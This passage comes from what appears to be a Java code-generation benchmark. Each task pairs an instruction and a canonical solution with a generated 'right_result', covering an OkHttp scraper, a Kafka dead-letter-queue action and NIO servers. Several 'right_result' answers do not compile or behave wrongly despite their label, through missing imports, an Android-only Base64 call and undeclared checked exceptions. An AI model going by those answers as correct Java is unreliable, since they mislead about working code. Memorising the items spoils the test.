    "right_result": "import okhttp3.*;\nimport java.io.IOException;\nimport java.util.Map;\nimport java.util.HashMap;\nimport java.util.stream.Collectors;\n\npublic class HttpUtil {\n    private static final String QUESTION_SEPARATE = \"?\";\n    private static final String PARAM_SEPARATE = \"&\";\n    private static final String KV_SEPARATE = \"=\";\n\n    private final OkHttpClient client = new OkHttpClient.Builder()\n            .connectTimeout(10, TimeUnit.SECONDS)\n            .readTimeout(10, TimeUnit.SECONDS)\n            .writeTimeout(10, TimeUnit.SECONDS)\n            .build();\n\n    public Resp doGet(String url) {\n        return executeRequest(new Request.Builder().url(url).get().build(), 3);\n    }\n\n    public Resp doGetWithHeader(String url, Map<String, String> headers) {\n        Request.Builder builder = new Request.Builder().url(url).get();\n        if (headers != null) {\n            for (Map.Entry<String, String> entry : headers.entrySet()) {\n                builder.header(entry.getKey(), entry.getValue());\n            }\n        }\n        return executeRequest(builder.build(), 3);\n    }\n\n    public Resp doGet(String url, Map<String, String> params) {\n        String queryString = buildQueryString(params);\n        String finalUrl = url + (url.contains(QUESTION_SEPARATE) ? PARAM_SEPARATE : QUESTION_SEPARATE) + queryString;\n        return executeRequest(new Request.Builder().url(finalUrl).get().build(), 3);\n    }\n\n    public Resp doPost(String url) {\n        return executeRequest(new Request.Builder().url(url).post(RequestBody.create(\"\", MediaType.get(\"application/json; charset=utf-8\"))).build(), 3);\n    }\n\n    public Resp doPost(String url, Map<String, String> params) {\n        FormBody.Builder formBuilder = new FormBody.Builder();\n        if (params != null) {\n            for (Map.Entry<String, String> entry : params.entrySet()) {\n                formBuilder.add(entry.getKey(), entry.getValue());\n            }\n        }\n        RequestBody formBody = formBuilder.build();\n        return executeRequest(new Request.Builder().url(url).post(formBody).build(), 3);\n    }\n\n    private Resp executeRequest(Request request, int retryTime) {\n        int retryCount = 0;\n        while (retryCount <= retryTime) {\n            try {\n                Response response = client.newCall(request).execute();\n                if (response.isSuccessful()) {\n                    return buildResp(response);\n                } else {\n                    retryCount++;\n                    if (retryCount > retryTime) {\n                        throw new RuntimeException(\"Failed to get response after \" + retryTime + \" retries\");\n                    }\n                }\n            } catch (IOException e) {\n                retryCount++;\n                if (retryCount > retryTime) {\n                    throw new RuntimeException(\"Failed to get response after \" + retryTime + \" retries\", e);\n                }\n            }\n        }\n        throw new RuntimeException(\"Unexpected error\");\n    }\n\n    private Resp buildResp(Response response) throws IOException {\n        String bodyStr = bodyToString(response.body());\n        return Resp.builder().code(response.code()).body(bodyStr).message(response.message()).build();\n    }\n\n    private String bodyToString(ResponseBody body) throws IOException {\n        return body.string();\n    }\n\n    private String buildQueryString(Map<String, String> params) {\n        if (params == null || params.isEmpty()) {\n            return \"\";\n        }\n        StringBuilder sb = new StringBuilder();\n        for (Map.Entry<String, String> entry : params.entrySet()) {\n            if (sb.length() > 0) {\n                sb.append(PARAM_SEPARATE);\n            }\n            sb.append(entry.getKey()).append(KV_SEPARATE).append(entry.getValue());\n        }\n        return sb.toString();\n    }\n\n    public static class Resp {\n        private final int code;\n        private final String body;\n        private final String message;\n\n        public Resp(int code, String body, String message) {\n            this.code = code;\n            this.body = body;\n            this.message = message;\n        }\n\n        public static RespBuilder builder() {\n            return new RespBuilder();\n        }\n\n        public int getCode() {\n            return code;\n        }\n\n        public String getBody() {\n            return body;\n        }\n\n        public String getMessage() {\n            return message;\n        }\n\n        public static class RespBuilder {\n            private int code;\n            private String body;\n            private String message;\n\n            public RespBuilder code(int code) {\n                this.code = code;\n                return this;\n            }\n\n            public RespBuilder body(String body) {\n                this.body = body;\n                return this;\n            }\n\n            public RespBuilder message(String message) {\n                this.message = message;\n                return this;\n            }\n\n            public Resp build() {\n                return new Resp(code, body, message);\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 250,
    "Instruction": "Task Description: Create a Java class that implements a web scraper using the OkHttp library to make HTTP requests, handle authentication, and process responses with retry logic for failed attempts.\n\nClass Description: The Scraper class provides functionality to scrape content from web URLs using HTTP requests. It supports basic authentication and includes timeout handling with retry logic for failed requests.\n\nAttributes:\n- client: OkHttpClient - The HTTP client instance used to make requests\n\nMethods:\n- Scraper() -> None - Constructor that initializes the OkHttpClient instance\n- scrape(String url, long timeoutMillis) -> List<String> - Scrapes content from the given URL without authentication, with a specified timeout\n- scrape(String url, String user, String password, long timeoutMillis) -> List<String> - Scrapes content from the given URL with basic authentication, with a specified timeout",
    "Canonical_solution": "import okhttp3.Credentials;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\nimport java.io.IOException;\nimport java.util.Arrays;\nimport java.util.List;\n\npublic class Scraper {\n\n    private OkHttpClient client;\n    \n    public Scraper() {\n        this.client = new OkHttpClient();\n    }\n\n    public List<String> scrape(String url, long timeoutMillis) {\n        return scrape(url, null, null, timeoutMillis);\n    }\n\n    public List<String> scrape(String url, String user, String password, long timeoutMillis) {\n        long start = System.currentTimeMillis();\n        Exception exception = null;\n        while (System.currentTimeMillis() - start < timeoutMillis) {\n            try {\n                Request.Builder requestBuilder = new Request.Builder()\n                        .header(\"Accept\", \"application/openmetrics-text; version=1.0.0; charset=utf-8\")\n                        .url(url);\n                if (user != null && password != null) {\n                    requestBuilder.header(\"Authorization\", Credentials.basic(user, password));\n                }\n                Request request = requestBuilder.build();\n                try (Response response = client.newCall(request).execute()) {\n                    if (response.code() != 200) {\n                        throw new IOException(\"Received HTTP Status \" + response.code() + \": \" + response.body().string());\n                    }\n                    return Arrays.asList(response.body().string().split(\"\\\\n\"));\n                }\n            } catch (Exception e) {\n                exception = e;\n                try {\n                    Thread.sleep(100);\n                } catch (InterruptedException ignored) {\n                }\n            }\n        }\n        if (exception != null) {\n            exception.printStackTrace();\n        }\n        return null;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "right_result": "import okhttp3.*;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Base64;\n\npublic class Scraper {\n    private OkHttpClient client;\n\n    public Scraper() {\n        client = new OkHttpClient.Builder()\n                .connectTimeout(10, TimeUnit.SECONDS)\n                .readTimeout(10, TimeUnit.SECONDS)\n                .build();\n    }\n\n    public List<String> scrape(String url, long timeoutMillis) {\n        int maxRetries = 3;\n        int retryCount = 0;\n        List<String> result = new ArrayList<>();\n        while (retryCount < maxRetries) {\n            try {\n                OkHttpClient client = new OkHttpClient.Builder()\n                        .connectTimeout(timeoutMillis, TimeUnit.MILLISECONDS)\n                        .readTimeout(timeoutMillis, TimeUnit.MILLISECONDS)\n                        .build();\n                Request request = new Request.Builder()\n                        .url(url)\n                        .build();\n                Response response = client.newCall(request).execute();\n                if (response.isSuccessful()) {\n                    String content = response.body().string();\n                    result.addAll(java.util.Arrays.asList(content.split(\"\\n\")));\n                    return result;\n                } else {\n                    throw new IOException(\"Unexpected code \" + response.code());\n                }\n            } catch (IOException e) {\n                retryCount++;\n                if (retryCount < maxRetries) {\n                    Thread.sleep(1000);\n                } else {\n                    throw new IOException(\"Failed to scrape after \" + maxRetries + \" retries\", e);\n                }\n            }\n        }\n        return result;\n    }\n\n    public List<String> scrape(String url, String user, String password, long timeoutMillis) {\n        int maxRetries = 3;\n        int retryCount = 0;\n        List<String> result = new ArrayList<>();\n        while (retryCount < maxRetries) {\n            try {\n                OkHttpClient client = new OkHttpClient.Builder()\n                        .connectTimeout(timeoutMillis, TimeUnit.MILLISECONDS)\n                        .readTimeout(timeoutMillis, TimeUnit.MILLISECONDS)\n                        .build();\n                String auth = Base64.encodeToString((user + \":\" + password).getBytes(), Base64.DEFAULT);\n                Request request = new Request.Builder()\n                        .url(url)\n                        .header(\"Authorization\", \"Basic \" + auth)\n                        .build();\n                Response response = client.newCall(request).execute();\n                if (response.isSuccessful()) {\n                    String content = response.body().string();\n                    result.addAll(java.util.Arrays.asList(content.split(\"\\n\")));\n                    return result;\n                } else {\n                    throw new IOException(\"Unexpected code \" + response.code());\n                }\n            } catch (IOException e) {\n                retryCount++;\n                if (retryCount < maxRetries) {\n                    Thread.sleep(1000);\n                } else {\n                    throw new IOException(\"Failed to scrape after \" + maxRetries + \" retries\", e);\n                }\n            }\n        }\n        return result;\n    }\n}"
  },
  {
    "Task_id": 256,
    "Instruction": "Task Description: Implement a Kafka Producer class for handling Dead Letter Queue (DLQ) messages in a rule-based processing system. The class should be able to configure a Kafka producer, convert various message types to bytes, populate message headers with rule context information, and send messages to a DLQ topic.\n\nClass Description: The `DlqAction` class is responsible for sending failed messages to a Dead Letter Queue (DLQ) topic in Kafka. It handles message serialization, header population, and asynchronous message sending with error handling. The class implements a `RuleAction` interface and provides configuration options for the DLQ topic and producer behavior.\n\nAttributes:\n\n- `log`: Logger - Logger instance for logging messages\n- `TYPE`: String - Constant identifying this action type as \"DLQ\"\n- `DLQ_TOPIC`: String - Configuration key for DLQ topic name\n- `DLQ_AUTO_FLUSH`: String - Configuration key for auto-flush setting\n- `PRODUCER`: String - Configuration key for producer instance\n- `HEADER_PREFIX`: String - Prefix for rule-related headers\n- `RULE_NAME`: String - Header key for rule name\n- `RULE_MODE`: String - Header key for rule mode\n- `RULE_SUBJECT`: String - Header key for rule subject\n- `RULE_TOPIC`: String - Header key for original topic\n- `RULE_EXCEPTION`: String - Header key for exception message\n- `configs`: Map<String, ?> - Configuration properties for the producer\n- `topic`: String - DLQ topic name\n- `autoFlush`: boolean - Flag for automatic flushing after send\n- `producer`: KafkaProducer<byte[], byte[]> - Kafka producer instance\n\nMethods:\n\n- `configure(Map<String, ?> configs)`: void - Configures the DLQ action with producer settings and topic name\n- `run(RuleContext ctx, Object message, RuleException ex)`: void - Processes and sends the message to DLQ topic\n- `producer()`: KafkaProducer<byte[], byte[]> - Returns or creates a Kafka producer instance\n- `convertToBytes(RuleContext ctx, Object message)`: byte[] - Converts various message types to byte arrays\n- `convertToJsonBytes(RuleContext ctx, Object message)`: byte[] - Converts objects to JSON byte arrays\n- `populateHeaders(RuleContext ctx, ProducerRecord<byte[], byte[]> producerRecord, RuleException ex)`: void - Adds rule context information to message headers\n- `toBytes(String value)`: byte[] - Helper method to convert strings to UTF-8 bytes\n- `baseProducerConfigs()`: Map<String, Object> - Creates base configuration for Kafka producer\n- `close()`: void - Closes the Kafka producer when no longer needed",
    "Canonical_solution": "import com.fasterxml.jackson.databind.JsonNode;\nimport io.confluent.kafka.schemaregistry.utils.JacksonMapper;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.charset.StandardCharsets;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.UUID;\nimport org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.common.errors.SerializationException;\nimport org.apache.kafka.common.header.Headers;\nimport org.apache.kafka.common.serialization.DoubleSerializer;\nimport org.apache.kafka.common.serialization.FloatSerializer;\nimport org.apache.kafka.common.serialization.IntegerSerializer;\nimport org.apache.kafka.common.serialization.LongSerializer;\nimport org.apache.kafka.common.serialization.ShortSerializer;\nimport org.apache.kafka.common.utils.Bytes;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class DlqAction implements RuleAction {\n\n  private static final Logger log = LoggerFactory.getLogger(DlqAction.class);\n\n  public static final String TYPE = \"DLQ\";\n  public static final String DLQ_TOPIC = \"dlq.topic\";\n  public static final String DLQ_AUTO_FLUSH = \"dlq.auto.flush\";\n  public static final String PRODUCER = \"producer\";\n  public static final String HEADER_PREFIX = \"__rule.\";\n  public static final String RULE_NAME = HEADER_PREFIX + \"name\";\n  public static final String RULE_MODE = HEADER_PREFIX + \"mode\";\n  public static final String RULE_SUBJECT = HEADER_PREFIX + \"subject\";\n  public static final String RULE_TOPIC = HEADER_PREFIX + \"topic\";\n  public static final String RULE_EXCEPTION = HEADER_PREFIX + \"exception\";\n\n  private static final LongSerializer LONG_SERIALIZER = new LongSerializer();\n  private static final IntegerSerializer INT_SERIALIZER = new IntegerSerializer();\n  private static final ShortSerializer SHORT_SERIALIZER = new ShortSerializer();\n  private static final DoubleSerializer DOUBLE_SERIALIZER = new DoubleSerializer();\n  private static final FloatSerializer FLOAT_SERIALIZER = new FloatSerializer();\n\n  private Map<String, ?> configs;\n  private String topic;\n  private boolean autoFlush;\n  private volatile KafkaProducer<byte[], byte[]> producer;\n\n  @Override\n  public void configure(Map<String, ?> configs) {\n    this.configs = configs;\n    this.topic = (String) configs.get(DLQ_TOPIC);\n    Object autoFlushConfig = configs.get(DLQ_AUTO_FLUSH);\n    if (autoFlushConfig != null) {\n      this.autoFlush = Boolean.parseBoolean(autoFlushConfig.toString());\n    }\n    this.producer = (KafkaProducer<byte[], byte[]>) configs.get(PRODUCER);\n  }\n\n  public void run(RuleContext ctx, Object message, RuleException ex) throws RuleException {\n    String topic = topic();\n    if (topic == null || topic.isEmpty()) {\n      topic = ctx.getParameter(DLQ_TOPIC);\n    }\n    if (topic == null || topic.isEmpty()) {\n      throw new SerializationException(\"Could not send to DLQ as no topic is configured\");\n    }\n    final String dlqTopic = topic;\n    try {\n      byte[] keyBytes = convertToBytes(ctx, ctx.originalKey());\n      byte[] valueBytes = convertToBytes(ctx, ctx.originalValue());\n      ProducerRecord<byte[], byte[]> producerRecord =\n          new ProducerRecord<>(dlqTopic, null, keyBytes, valueBytes, ctx.headers());\n      populateHeaders(ctx, producerRecord, ex);\n      producer().send(producerRecord, (metadata, exception) -> {\n        if (exception != null) {\n          log.error(\"Could not produce message to DLQ topic {}\", dlqTopic, exception);\n        } else {\n          log.info(\"Sent message to DLQ topic {}\", dlqTopic);\n        }\n      });\n      if (autoFlush) {\n        producer.flush();\n      }\n    } catch (Exception e) {\n      log.error(\"Could not produce message to DLQ topic {}\", dlqTopic, e);\n    }\n    throw ex != null ? new SerializationException(\"Rule failed: \" + ctx.rule().getName(), ex)\n        : new SerializationException(\"Rule failed: \" + ctx.rule().getName());\n  }\n\n  private KafkaProducer<byte[], byte[]> producer() {\n    if (producer == null) {\n      Map<String, Object> producerConfigs = baseProducerConfigs();\n      producerConfigs.putAll(configs);\n      synchronized (this) {\n        if (producer == null) {\n          producer = new KafkaProducer<>(producerConfigs);\n        }\n      }\n    }\n    return producer;\n  }\n\n  private byte[] convertToBytes(RuleContext ctx, Object message) throws IOException {\n    if (message == null) {\n      return null;\n    } else if (message instanceof byte[]) {\n      return (byte[]) message;\n    } else if (message instanceof ByteBuffer) {\n      ByteBuffer buffer = (ByteBuffer) message;\n      byte[] bytes = new byte[buffer.remaining()];\n      buffer.get(bytes);\n      return bytes;\n    } else if (message instanceof Bytes) {\n      return ((Bytes) message).get();\n    } else if (message instanceof String || message instanceof UUID) {\n      return message.toString().getBytes(StandardCharsets.UTF_8);\n    } else if (message instanceof Long) {\n      return LONG_SERIALIZER.serialize(ctx.topic(), (Long)message);\n    } else if (message instanceof Integer) {\n      return INT_SERIALIZER.serialize(ctx.topic(), (Integer) message);\n    } else if (message instanceof Short) {\n      return SHORT_SERIALIZER.serialize(ctx.topic(), (Short) message);\n    } else if (message instanceof Double) {\n      return DOUBLE_SERIALIZER.serialize(ctx.topic(), (Double) message);\n    } else if (message instanceof Float) {\n      return FLOAT_SERIALIZER.serialize(ctx.topic(), (Float) message);\n    } else {\n      return convertToJsonBytes(ctx, message);\n    }\n  }\n\n  private byte[] convertToJsonBytes(RuleContext ctx, Object message) throws IOException {\n    JsonNode json = ctx.target().toJson(message);\n    return JacksonMapper.INSTANCE.writeValueAsBytes(json);\n  }\n\n  private void populateHeaders(\n      RuleContext ctx, ProducerRecord<byte[], byte[]> producerRecord, RuleException ex) {\n    Headers headers = producerRecord.headers();\n    headers.add(RULE_NAME, toBytes(ctx.rule().getName()));\n    headers.add(RULE_MODE, toBytes(ctx.ruleMode().name()));\n    headers.add(RULE_SUBJECT, toBytes(ctx.subject()));\n    headers.add(RULE_TOPIC, toBytes(ctx.topic()));\n    if (ex != null) {\n      headers.add(RULE_EXCEPTION, toBytes(ex.getMessage()));\n    }\n  }\n\n  private byte[] toBytes(String value) {\n    if (value != null) {\n      return value.getBytes(StandardCharsets.UTF_8);\n    } else {\n      return null;\n    }\n  }\n\n  static Map<String, Object> baseProducerConfigs() {\n    Map<String, Object> producerProps = new HashMap<>();\n    producerProps.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG,\n        \"org.apache.kafka.common.serialization.ByteArraySerializer\");\n    producerProps.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG,\n        \"org.apache.kafka.common.serialization.ByteArraySerializer\");\n    producerProps.put(ProducerConfig.MAX_BLOCK_MS_CONFIG, Long.toString(Long.MAX_VALUE));\n    producerProps.put(ProducerConfig.ENABLE_IDEMPOTENCE_CONFIG, \"false\");\n    producerProps.put(ProducerConfig.ACKS_CONFIG, \"all\");\n    producerProps.put(ProducerConfig.MAX_IN_FLIGHT_REQUESTS_PER_CONNECTION, \"1\");\n    producerProps.put(ProducerConfig.DELIVERY_TIMEOUT_MS_CONFIG,\n        Integer.toString(Integer.MAX_VALUE));\n    return producerProps;\n  }\n\n  @Override\n  public void close() {\n    if (producer != null) {\n      producer.close();\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "right_result": "```java\nimport org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.common.serialization.ByteArraySerializer;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.nio.charset.StandardCharsets;\nimport java.util.*;\n\npublic class DlqAction implements RuleAction {\n    private final Logger log = LoggerFactory.getLogger(DlqAction.class);\n    private static final String TYPE = \"DLQ\";\n    private static final String DLQ_TOPIC = \"dlq.topic\";\n    private static final String DLQ_AUTO_FLUSH = \"dlq.auto.flush\";\n    private static final String PRODUCER = \"producer\";\n    private static final String HEADER_PREFIX = \"rule.\";\n    private static final String RULE_NAME = \"rule.name\";\n    private static final String RULE_MODE = \"rule.mode\";\n    private static final String RULE_SUBJECT = \"rule.subject\";\n    private static final String RULE_TOPIC = \"rule.topic\";\n    private static final String RULE_EXCEPTION = \"rule.exception\";\n\n    private final Map<String, ?> configs;\n    private String topic;\n    private boolean autoFlush;\n    private KafkaProducer<byte[], byte[]> producer;\n\n    public void configure(Map<String, ?> configs) {\n        this.configs = configs;\n        this.topic = (String) configs.get(DLQ_TOPIC);\n        this.autoFlush = (Boolean) configs.get(DLQ_AUTO_FLUSH);\n        this.producer = producer();\n    }\n\n    public void run(RuleContext ctx, Object message, RuleException ex) {\n        try {\n            byte[] bytes = convertToBytes(ctx, message);\n            ProducerRecord<byte[], byte[]> record = new ProducerRecord<>(topic, bytes);\n            populateHeaders(ctx, record, ex);\n            producer().send(record, (metadata, exception) -> {\n                if (exception != null) {\n                    log.error(\"Failed to send DLQ message\", exception);\n                } else {\n                    log.info(\"Sent DLQ message to topic {}\", topic);\n                }\n            });\n        } catch (Exception e) {\n            log.error(\"Error processing DLQ message\", e);\n        }\n    }\n\n    private KafkaProducer<byte[], byte[]> producer() {\n        if (this.producer == null) {\n            Map<String, Object> producerConfigs = baseProducerConfigs();\n            for (Map.Entry<String, Object> entry : configs.entrySet()) {\n                if (!entry.getKey().equals(DLQ_TOPIC)) {\n                    producerConfigs.put(entry.getKey(), entry.getValue());\n                }\n            }\n            this.producer = new KafkaProducer<>(producerConfigs);\n        }\n        return this.producer;\n    }\n\n    private byte[] convertToBytes(RuleContext ctx, Object message) {\n        if (message instanceof String) {\n            return toBytes((String) message);\n        } else {\n            return convertToJsonBytes(ctx, message);\n        }\n    }\n\n    private byte[] convertToJsonBytes(RuleContext ctx, Object message) {\n        // Assume Jackson is available\n        try {\n            return new ObjectMapper().writeValueAsBytes(message);\n        } catch (Exception e) {\n            log.error(\"Error converting message to JSON\", e);\n            return toBytes(\"Error serializing message\");\n        }\n    }\n\n    private byte[] toBytes(String value) {\n        return value.getBytes(StandardCharsets.UTF_8);\n    }\n\n    private void populateHeaders(RuleContext ctx, ProducerRecord<byte[], byte[]> producerRecord, RuleException ex) {\n        producerRecord.headers().add(HEADER_PREFIX + RULE_NAME, toBytes(ctx.getRuleName()));\n        producerRecord.headers().add(HEADER_PREFIX + RULE_MODE, toBytes(ctx.getRuleMode()));\n        producerRecord.headers().add(HEADER_PREFIX + RULE_SUBJECT, toBytes(ctx.getRuleSubject()));\n        producerRecord.headers().add(HEADER_PREFIX + RULE_TOPIC, toBytes(ctx.getOriginalTopic()));\n        producerRecord.headers().add(HEADER_PREFIX + RULE_EXCEPTION, toBytes(ex.getMessage()));\n    }\n\n    private Map<String, Object> baseProducerConfigs() {\n        Map<String, Object> configs = new HashMap<>();\n        configs.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, \"localhost:9092\");\n        configs.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, ByteArraySerializer.class);\n        configs.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, ByteArraySerializer.class);\n        configs.put(ProducerConfig.ACKS_CONFIG, \"1\");\n        configs.put(ProducerConfig.RETRIES_CONFIG, 3);\n        return configs;\n    }\n\n    public void close() {\n        if (producer != null) {\n            producer.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 263,
    "Instruction": "Task Description: Implement a Java NIO HTTP server that handles multiple client connections asynchronously, measures throughput performance, and tracks message statistics.\n\nClass Description: NioServerPerfTest is a non-blocking NIO server implementation that accepts client connections, reads data efficiently, and tracks performance metrics including bytes received, messages processed, and throughput rates.\n\nAttributes:\n- ch: [ServerSocketChannel] - The server socket channel listening for incoming connections\n- selector: [Selector] - The selector managing multiple non-blocking channels\n- running: [boolean] - Flag controlling server execution\n- buffer: [ByteBuffer] - Buffer for reading incoming data\n- total_bytes_received: [AtomicLong] - Counter for total bytes received\n- total_msgs: [AtomicLong] - Counter for total messages processed\n- start: [AtomicLong] - Timestamp for performance measurement start\n\nMethods:\n- create: [create(int size, boolean direct)] -> [ByteBuffer] - Creates a new ByteBuffer of given size, optionally direct\n- start: [start(boolean direct)] -> [void] - Starts the NIO server with specified buffer type (direct/heap)\n- handle: [handle(SocketChannel ch, ByteBuffer buf)] -> [boolean] - Handles read operations from a client channel, returns false to close connection",
    "Canonical_solution": "import org.jgroups.util.Util;\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Iterator;\nimport java.util.Set;\nimport java.util.concurrent.atomic.AtomicLong;\n\npublic class NioServerPerfTest {\n    protected ServerSocketChannel ch;\n    protected Selector            selector;\n    protected volatile boolean    running=true;\n    protected ByteBuffer          buffer;\n    protected final AtomicLong    total_bytes_received=new AtomicLong(0);\n    protected final AtomicLong    total_msgs=new AtomicLong(0);\n    protected final AtomicLong    start=new AtomicLong(0);\n\n    public static final long      BYTES_TO_SEND=10_000_000;\n    public static final int       SIZE=1000;\n\n    protected static ByteBuffer create(int size, boolean direct) {\n        return direct? ByteBuffer.allocateDirect(size) : ByteBuffer.allocate(size);\n    }\n\n    protected void start(boolean direct) throws Exception {\n        selector=Selector.open();\n\n        ch=ServerSocketChannel.open();\n        ch.bind(new InetSocketAddress(\"0.0.0.0\", 7500));\n        ch.configureBlocking(false);\n        ch.register(selector, SelectionKey.OP_ACCEPT, null);\n        System.out.println(\"-- server ready\");\n\n        while(running) {\n            selector.select();\n            Set<SelectionKey> keys=selector.selectedKeys();\n            for(Iterator<SelectionKey> it=keys.iterator(); it.hasNext();) {\n                SelectionKey key=it.next();\n                if(!key.isValid()) {\n                    it.remove();\n                    continue;\n                }\n                it.remove();\n                if(key.isAcceptable()) {\n                    SocketChannel client_ch=ch.accept();\n                    if(client_ch != null) {\n                        System.out.printf(\"accepted connection from %s\\n\", client_ch.getRemoteAddress());\n                        client_ch.configureBlocking(false);\n                        client_ch.register(selector, SelectionKey.OP_READ, create(SIZE, direct));\n                    }\n                }\n                else if(key.isReadable()) {\n                    if(!handle((SocketChannel)key.channel(), (ByteBuffer)key.attachment())) {\n                        key.cancel();\n                        Util.close(key.channel());\n                    }\n                }\n            }\n        }\n\n        Util.close(selector,ch);\n    }\n\n    protected boolean handle(SocketChannel ch, ByteBuffer buf) {\n        try {\n            if(start.get() == 0)\n                start.compareAndSet(0, System.currentTimeMillis());\n            int num=ch.read(buf);\n            if(num < 0)\n                return false;\n            total_bytes_received.addAndGet(num);\n            if(!buf.hasRemaining()) {\n                total_msgs.incrementAndGet();\n                buf.rewind();\n            }\n            if(total_bytes_received.get() >= BYTES_TO_SEND) {\n                long time=System.currentTimeMillis() - start.get();\n                double throughput_sec=total_bytes_received.get() / (time / 1000.0), msgs_sec=total_msgs.get() / (time / 1000.0);\n                System.out.printf(\"\\n===========================\\nreceived %d messages in %.2f secs: throughput: %s/sec, %.2f msgs/sec\\n\",\n                                  total_msgs.get(), time/1000.0, Util.printBytes(throughput_sec), msgs_sec);\n                start.set(0);\n                total_bytes_received.set(0);\n                total_msgs.set(0);\n                return false;\n            }\n        }\n        catch(IOException e) {\n            e.printStackTrace();\n        }\n        return true;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 21,
    "right_result": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.*;\nimport java.util.Iterator;\nimport java.util.concurrent.atomic.AtomicLong;\n\npublic class NioServerPerfTest {\n    private ServerSocketChannel ch;\n    private Selector selector;\n    private boolean running;\n    private ByteBuffer buffer;\n    private AtomicLong total_bytes_received = new AtomicLong(0);\n    private AtomicLong total_msgs = new AtomicLong(0);\n    private AtomicLong start = new AtomicLong(0);\n\n    public ByteBuffer create(int size, boolean direct) {\n        return direct ? ByteBuffer.allocateDirect(size) : ByteBuffer.allocate(size);\n    }\n\n    public void start(boolean direct) {\n        try {\n            ch = ServerSocketChannel.open();\n            ch.bind(new InetSocketAddress(8080));\n            ch.configureBlocking(false);\n            selector = Selector.open();\n            buffer = create(1024, direct);\n            ch.register(selector, SelectionKey.OP_ACCEPT);\n            running = true;\n            start.set(System.nanoTime());\n            while (running) {\n                int keys = selector.select();\n                if (keys > 0) {\n                    Iterator<SelectionKey> iter = selector.selectedKeys().iterator();\n                    while (iter.hasNext()) {\n                        SelectionKey key = iter.next();\n                        iter.remove();\n                        if (key.isAcceptable()) {\n                            ServerSocketChannel ss = (ServerSocketChannel) key.channel();\n                            SocketChannel client = ss.accept();\n                            client.configureBlocking(false);\n                            client.register(selector, SelectionKey.OP_READ);\n                        } else if (key.isReadable()) {\n                            SocketChannel ch = (SocketChannel) key.channel();\n                            ByteBuffer buf = buffer;\n                            boolean handled = handle(ch, buf);\n                            if (!handled) {\n                                ch.close();\n                            }\n                        }\n                    }\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public boolean handle(SocketChannel ch, ByteBuffer buf) {\n        int bytesRead = ch.read(buf);\n        if (bytesRead == -1) {\n            return false;\n        }\n        total_bytes_received.addAndGet(bytesRead);\n        buf.flip();\n        total_msgs.incrementAndGet();\n        buf.clear();\n        return buf.hasRemaining();\n    }\n}"
  },
  {
    "Task_id": 265,
    "Instruction": "Task Description: Implement a Java NIO HTTP server that handles client connections asynchronously, processes incoming requests, and sends responses back to clients. The server should use non-blocking I/O operations managed by a Selector to efficiently handle multiple connections.\n\nClass Description: NioHttpServer is a class that implements a non-blocking HTTP server using Java NIO (New I/O) capabilities. It manages client connections, reads incoming requests, and writes responses asynchronously. The server can also make HTTP requests to external services (like Baidu in the example) to fetch response data.\n\nAttributes:\n- charset: [Charset] - The character set used for encoding/decoding text data (UTF-8 in this case)\n- client: [HttpClient] - Apache HttpClient instance used to make external HTTP requests\n\nMethods:\n- startServer: [startServer(int port)] -> [void] - Starts the HTTP server on the specified port, initializes the ServerSocketChannel and Selector, and begins the event loop to handle client connections\n- handleAccept: [handleAccept(SelectionKey key, Selector selector)] -> [void] - Handles new client connections by accepting the SocketChannel and registering it with the selector for write operations\n- handleRead: [handleRead(SelectionKey key, Selector selector)] -> [void] - Handles incoming data from clients by reading from the SocketChannel and preparing for write operations\n- handleWrite: [handleWrite(SelectionKey key, Selector selector)] -> [void] - Handles writing data to clients by sending responses through the SocketChannel and preparing for read operations\n- executeResponse: [executeResponse()] -> [String] - Makes an HTTP GET request to an external service (Baidu in the example) and returns the response body as a string",
    "Canonical_solution": "import org.apache.commons.codec.Charsets;\nimport org.apache.http.HttpResponse;\nimport org.apache.http.HttpStatus;\nimport org.apache.http.client.HttpClient;\nimport org.apache.http.client.methods.HttpGet;\nimport org.apache.http.impl.client.HttpClientBuilder;\nimport org.apache.http.util.EntityUtils;\n\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.nio.charset.Charset;\nimport java.util.Iterator;\nimport java.util.Set;\n\npublic class NioHttpServer {\n\n    private static Charset charset = Charset.forName(\"UTF8\");\n    private HttpClient client = HttpClientBuilder.create().build();\n\n    public void startServer(int port) throws IOException {\n        ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();\n        Selector selector = Selector.open();\n        serverSocketChannel.socket().bind(new InetSocketAddress(port));\n        serverSocketChannel.configureBlocking(false);\n        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);\n\n        while (true) {\n            if (selector.select(1) > 0) {\n                Set<SelectionKey> set = selector.selectedKeys();\n                Iterator<SelectionKey> keyIterator = set.iterator();\n                while 